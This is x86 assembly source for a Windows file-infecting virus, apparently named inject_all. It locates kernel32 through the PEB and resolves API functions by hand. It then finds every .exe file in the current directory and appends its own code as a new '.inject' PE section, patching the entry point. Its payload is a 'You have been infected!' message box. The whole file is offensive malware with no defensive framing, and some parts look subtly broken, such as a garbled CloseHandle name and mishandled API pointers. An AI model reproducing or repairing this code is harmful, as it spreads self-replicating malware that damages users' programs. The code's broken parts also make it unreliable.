.386
.model flat, stdcall
option casemap:none

; ---------------- helper constant offsets ------------------
PEB_LdrOffset      equ 0Ch   ; =12 PEB->Ldr
LDR_InInitOffset   equ 1Ch   ; =28 _PEB_LDR_DATA.InInitializationOrderModuleList
LDR_DllBaseOffset  equ 18h   ; =24 _LDR_DATA_TABLE_ENTRY.DllBase
LDR_BaseNameOffset equ 2Ch   ; =44 _LDR_DATA_TABLE_ENTRY.BaseDllName.Buffer
IMAGE_DOS_e_lfanew equ 3Ch   ; =60 e_lfanew
OPTIONAL_EPT       equ 28h   ; =40 AddressOfEntryPoint inside OptionalHeader
WIN32_FIND_DATA_sz equ 260h  ; =608 minimal buffer for filename
INVALID_HANDLE     equ -1    ; Gi� tr? l?i tr? v? t? API
GEN_READ_WRITE     equ 80h or 40h    ;= 128 | 64
FILE_SHARE_R       equ 1
OPEN_EXISTING      equ 3
FILE_END_PTR       equ 2

; -------------- R/W fields embedded in code ---------------
.data
msgBoxPtr  dd 0
getProcPtr dd 0
loadLibPtr dd 0
markerTxt  db 'INFCTED',0
selfName     db 'inject_all.exe',0
origOEP    dd 0
selfSize   dd 0
getModFileNamePtr dd 0
getmod_str db 'GetModuleFileNameA',0

; ----------------------------------------------------------
.code
assume fs:nothing
shell_begin label byte
start:
    ; === 1. Locate kernel32 base ===
    xor     eax,eax
    mov     eax,dword ptr fs:[30h]
    mov     eax,[eax+PEB_LdrOffset]
    mov     esi,[eax+LDR_InInitOffset]
find_k32:
    mov     ebx,[esi+LDR_DllBaseOffset]      ; EBX = DllBase
    mov     edi,[esi+LDR_BaseNameOffset]     ; EDI = ptr UNICODE name
    mov     eax,[edi]                        ; 2 wchar: 'k','e'
    cmp     eax,0065006Bh
    jne     next_mod
    mov     eax,[edi+4]
    cmp     eax,006E0072h
    jne     next_mod
    mov     ax,[edi+8]
    cmp     ax,0065h
    jne     next_mod
    jmp     got_k32
next_mod:
    mov     esi,[esi]
    jmp     find_k32

; === 2. Resolve GetProcAddress / LoadLibraryA ===
got_k32:
    push    ebx
    call    resolve_exports
    mov     [getProcPtr], eax
    mov     [loadLibPtr], edx

; === 3. Load user32 & MessageBoxA ===
    sub     esp, 12
    mov     dword ptr [esp],    72657375h ; "user"
    mov     dword ptr [esp+4 ], 642E3233h ; "32.d"
    mov     dword ptr [esp+8 ], 00006C6Ch ; "ll"
    push    esp
    call    edx
    add     esp, 16
    mov     ebx, eax

    sub     esp, 12
    mov     dword ptr [esp],    7373654Dh ; "Mess"
    mov     dword ptr [esp+4 ], 42656761h ; "ageB"
    mov     dword ptr [esp+8 ], 0041786Fh ; "oxA"
    push    esp
    push    ebx
    call    [getProcPtr]
    add     esp, 16
    mov     [msgBoxPtr], eax

; === 4. Calculate self size ===
    call    $+5
    pop     esi
    lea     edi, shell_end
    sub     edi, esi
    mov     [selfSize], edi

; === 5. Save host OEP ===
    mov     eax,fs:[30h]
    mov     eax,[eax+10h]
    mov     ecx,[eax+IMAGE_DOS_e_lfanew]
    mov     ecx,[eax+ecx+OPTIONAL_EPT]
    add     ecx,eax
    mov     [origOEP], ecx

    ; === 6. Cross‑infect *.exe ===
    sub     esp,8
    mov     dword ptr [esp], 78652E2Ah  ; '*.ex'
    mov     dword ptr [esp+4], 00000065h ; 'e'
    push    esp
    sub     esp, WIN32_FIND_DATA_sz
    mov     edi, esp                     ; WIN32_FIND_DATA buffer
    push    edi
    call    find_first
    add     esp, WIN32_FIND_DATA_sz+8
    mov     ebx, eax    ; hFind

infect_loop:
    cmp     ebx, INVALID_HANDLE
    je      infect_done
    lea     esi, [edi+2Ch]   ; ESI = ptr to cFileName

    ; --- Skip infecting self by name ---
    mov     edx, esi         ; EDX -> current file name
    lea     ecx, selfName    ; ECX -> own exe name
cmp_name:
    mov     al, [edx]
    mov     bl, [ecx]
    or      al, 20h          ; to lower-case
    or      bl, 20h          ; to lower-case
    cmp     al, bl
    jne     name_diff
    cmp     al, 0
    je      next_file        ; matched name -> skip self
    inc     edx
    inc     ecx
    jmp     cmp_name
name_diff:
    ; --- proceed to infect this file ---
    push    0
    push    GEN_READ_WRITE
    push    OPEN_EXISTING
    push    0
    push    FILE_SHARE_R
    push    esi
    call    create_file
    mov     ecx, eax
    cmp     eax, INVALID_HANDLE
    je      next_file

    ; read first 32 bytes to check marker
    sub     esp, 32
    push    0
    lea     edx, [esp]
    push    edx
    push    32
    push    ecx
    call    read_file
    mov     edx, esp
    mov     edi, offset markerTxt
scan_loop:
    mov     al, [edx]
    cmp     al, 0
    je      not_infected
    cmp     al, [edi]
    je      already_inf
    inc     edx
    jmp     scan_loop
already_inf:
    add     esp, 32
    push    ecx
    call    close_handle
    jmp     next_file

; === Begin section injection ===
not_infected:
    push    0
    push    0
    push    ecx
    call    set_ptr

    sub     esp, 1024
    lea     edi, [esp]
    push    0
    push    edi
    push    1024
    push    ecx
    call    read_file

    mov     ebx, edi
    mov     eax, [ebx + 3Ch]
    add     eax, ebx
    mov     esi, eax
    inc     word ptr [esi + 6]

    mov     cx, [esi + 6]
    dec     cx
    mov     edx, [esi + 14h]
    mov     eax, edx
    add     eax, 18h
    lea     edi, [esi + eax]
    mov     eax, 28h
    mul     cx
    add     edi, eax

    mov     dword ptr [edi], ".inj"
    mov     dword ptr [edi+4], 00637465h   ; "ect" + null

    sub     edi, 28h
    mov     eax, [edi + 0Ch]
    mov     ecx, [edi + 8]
    add     ecx, eax
    add     edi, 28h
    mov     [edi + 8], ecx

    mov     eax, [selfSize]
    mov     [edi + 0Ch], eax
    mov     [edi + 10h], eax

    sub     edi, 28h
    mov     eax, [edi + 14h]
    mov     ecx, [edi + 10h]
    add     eax, ecx
    add     edi, 28h
    mov     [edi + 14h], eax

    mov     dword ptr [edi + 24h], 60000020h

    mov     eax, [edi + 8]
    mov     [esi + 28h], eax

    add     eax, [edi + 0Ch]
    mov     edx, [esi + 50h]
    add     edx, eax
    and     edx, 0FFFFF000h
    mov     [esi + 38h], edx

    mov     eax, [edi + 14h]
    push    0
    push    0
    push    eax
    push    ecx
    call    set_ptr

    push    0
    push    [selfSize]
    push    offset shell_begin
    push    ecx
    call    write_file

    push    0
    push    0
    push    0
    push    ecx
    call    set_ptr

    push    0
    push    1024
    push    ebx
    push    ecx
    call    write_file

    add     esp,32
    push    ecx
    call    close_handle
next_file:
    push    edi
    push    ebx
    call    find_next
    mov     ebx,eax
    jmp     infect_loop
infect_done:
    push    ebx
    call    find_close

; === 7. Payload ===
    sub     esp, 8
    mov     dword ptr [esp],    72656C41h ; "Aler"
    mov     dword ptr [esp+4 ], 00000074h ; "t"
    lea     ebx, [esp]

    sub     esp, 24
    mov     dword ptr [esp],    20756F59h ; "You "
    mov     dword ptr [esp+4 ], 65766168h ; "have"
    mov     dword ptr [esp+8 ], 65656220h ; " bee"
    mov     dword ptr [esp+12], 6E69206Eh ; "n in"
    mov     dword ptr [esp+16], 74636566h ; "fect"
    mov     dword ptr [esp+20], 00216465h ; "ed!"
    lea     ecx, [esp]

    push    0
    push    ebx
    push    ecx
    push    0
    call    [msgBoxPtr]

    add     esp, 48

; === 8. Return to OEP ===
    jmp     [origOEP]

shell_end:
    nop

; === Helper wrappers ===
find_first proc
    push    ebp
    mov     ebp,esp
    sub     esp,16
    mov     dword ptr [esp],    646E6946h ; "Find"
    mov     dword ptr [esp+4 ], 73726946h ; "Firs"
    mov     dword ptr [esp+8 ], 6C694674h ; "tFil"
    mov     dword ptr [esp+12], 00004165h ; "eA"
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,20
    jmp     eax
find_first endp

find_next proc
    push    ebp
    mov     ebp,esp
    sub     esp,16
    mov     dword ptr [esp],    646E6946h ; "Find"
    mov     dword ptr [esp+4 ], 7478654Eh ; "Next"
    mov     dword ptr [esp+8 ], 656C6946h ; "File"
    mov     dword ptr [esp+12], 00000041h ; "A"
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,20
    jmp     eax
find_next endp

find_close proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],    646E6946h ; "Find"
    mov     dword ptr [esp+4 ], 736F6C43h ; "Clos"
    mov     dword ptr [esp+8 ], 00000065h ; "e"
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
find_close endp

create_file proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],    61657243h ; "Crea"
    mov     dword ptr [esp+4 ], 69466574h ; "teFi"
    mov     dword ptr [esp+8 ], 0041656Ch ; "leA"
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
create_file endp

read_file proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],    64616552h ; "Read"
    mov     dword ptr [esp+4 ], 656C6946h ; "File"
    mov     dword ptr [esp+8 ], 00000041h ; "A"
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
read_file endp

write_file proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],    74697257h ; "Writ"
    mov     dword ptr [esp+4 ], 6C694665h ; "eFil"
    mov     dword ptr [esp+8 ], 00004165h ; "eA"
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
write_file endp

set_ptr proc
    push    ebp
    mov     ebp,esp
    sub     esp,16
    mov     dword ptr [esp],    46746553h ; "SetF"
    mov     dword ptr [esp+4 ], 50656C69h ; "ileP"
    mov     dword ptr [esp+8 ], 746E696Fh ; "oint"
    mov     dword ptr [esp+12], 00007265h ; "er"
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,20
    jmp     eax
set_ptr endp

resolve_exports proc
    pushad
    mov     esi, [esp+32 + 4]     ; kernel32 base passed from caller

    ; === Parse PE header ===
    mov     edi, esi              ; edi = base
    add     edi, [edi + 3Ch]      ; edi = &NT Headers
    mov     edi, [edi + 78h]      ; edi = RVA of export table
    add     edi, esi              ; edi = &Export Directory

    ; === Get function/address/name tables ===
    mov     ebx, [edi + 1Ch]      ; ebx = RVA of AddressOfNames
    add     ebx, esi
    mov     ecx, [edi + 18h]      ; ecx = Number of Names
    mov     edx, [edi + 20h]      ; edx = RVA of AddressOfNameOrdinals
    add     edx, esi
    mov     edi, [edi + 24h]      ; edi = RVA of AddressOfFunctions
    add     edi, esi

find_functions:
    mov     eax, [ebx]            ; get RVA of function name
    add     eax, esi              ; convert to VA
    push    ecx
    push    ebx
    push    edx
    push    edi

    ; === Compare string for GetProcAddress ===
    mov     ecx, 15
    mov     edi, eax
    lea     esi, getproc_str
    repe cmpsb
    je      found_getproc

    ; === Compare string for LoadLibraryA ===
    pop     edi
    pop     edx
    pop     ebx
    pop     ecx

    mov     eax, [ebx]            ; get RVA of function name
    add     eax, esi
    push    ecx
    push    ebx
    push    edx
    push    edi

    mov     ecx, 13
    mov     edi, eax
    lea     esi, loadlib_str
    repe cmpsb
    je      found_loadlib

    ; === Continue ===
    pop     edi
    pop     edx
    pop     ebx
    pop     ecx

    add     ebx, 4                ; next name
    add     edx, 2
    loop    find_functions
    popad
    xor     eax, eax
    xor     edx, edx
    ret

found_getproc:
    pop     edi
    pop     edx
    pop     ebx
    pop     ecx
    movzx   eax, word ptr [edx]
    shl     eax, 2
    mov     eax, [edi + eax]
    add     eax, [esp+32 + 4]
    mov     [esp+32], eax        ; store GetProcAddress
    jmp     short resume

found_loadlib:
    pop     edi
    pop     edx
    pop     ebx
    pop     ecx
    movzx   edx, word ptr [edx]
    shl     edx, 2
    mov     edx, [edi + edx]
    add     edx, [esp+32 + 4]
    mov     [esp+36], edx        ; store LoadLibraryA

resume:
    popad
    mov     eax, [esp]
    mov     edx, [esp+4]
    ret 4

getproc_str db 'GetProcAddress',0
loadlib_str db 'LoadLibraryA',0
resolve_exports endp

close_handle proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],    65436C43h ; 'ClCe'
    mov     dword ptr [esp+4 ], 00656C64h ; 'dle'
    mov     dword ptr [esp+8 ], 00000000h ; padding (null-terminated)
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
close_handle endp


END start